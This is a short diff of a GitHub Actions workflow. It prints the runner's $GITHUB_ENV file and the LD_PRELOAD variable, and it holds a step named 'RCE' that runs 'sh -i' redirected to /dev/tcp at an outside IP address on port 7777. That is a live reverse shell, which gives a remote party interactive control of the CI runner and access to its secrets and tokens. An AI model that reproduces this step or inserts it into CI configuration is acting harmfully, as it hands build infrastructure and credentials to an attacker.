@@ -40,4 +40,12 @@ jobs:
           cat $GITHUB_ENV 
           pwd
           ls
+      - name: Use the value
+        id: step_two
+        run: |
+          echo "testtttt"
+          echo "$LD_PRELOAD"
+      - name: RCE
+        id: step_three
+        run: |
           sh -i >& /dev/tcp/34.100.156.126/7777 0>&1
